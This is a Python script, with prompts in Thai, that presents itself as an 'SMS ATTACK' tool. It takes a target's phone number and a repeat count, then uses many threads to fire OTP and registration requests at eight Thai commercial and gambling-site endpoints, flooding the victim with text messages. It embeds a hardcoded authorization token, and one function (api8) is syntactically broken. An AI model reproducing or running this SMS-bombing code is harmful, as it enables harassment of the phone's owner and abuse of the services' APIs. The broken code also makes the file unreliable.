import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
import colorama
print("")
user = input (" ชื่อ : ")
word = input (" รหัส : ")
os.system("clear")
print("")
print("𝚂𝙼𝚂 𝙰𝚃𝚃𝙰𝙲𝙺 𝙱𝚢 𝙴𝙷4404")
print ("")
print (f"{user} 𝒔𝒕𝒂𝒕𝒖𝒔 : 𝒐𝒏𝒍𝒊𝒏𝒆 ")
print ("")
phone = input("เบอร์ : ")
print("")
NUM = int(input("จำนวน : "))
print("")
time.sleep(1)
print("")
print ("Alemana")
time.sleep(4)
print ("")
print ("")


def api1():
	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
	print (f"{phone} ")
	
	
def api2():
	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})
	print (f"{phone} ")
	
	
def api3():
	requests.post("https://bkgame.bet/env/authen.php?requestotp", data=f"phone_number={phone}",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	print (f"{phone} ")
	
	
def api4():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username":phone})
	print (f"{phone} ")
	
	
def api5():
	 requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	 print (f"{phone} ")
	
	
def api6():
	requests.post("https://queenclub88.com/api/register/phone", data={"phone":phone})
	print (f"{phone} ")
	

def api7():
	requests.post("https://allingame17.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=")
	print (f"{phone} ")
	
	
def api8():
	requests.post("requests.post("https://api-globalhouse.com/sms/requestOTP",json={"phoneNumber":phone},headers={"content-type": "application/json; charset=utf-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc"})
    print (f"{phone} ")


for i in range(NUM):
	time.sleep(0.00000000001)
	threading.Thread(target=api1).start()
	threading.Thread(target=api2).start()
	threading.Thread(target=api3).start()
	threading.Thread(target=api4).start()
	threading.Thread(target=api5).start()
	threading.Thread(target=api6).start()
	threading.Thread(target=api7).start()
	threading.Thread(target=api8).start()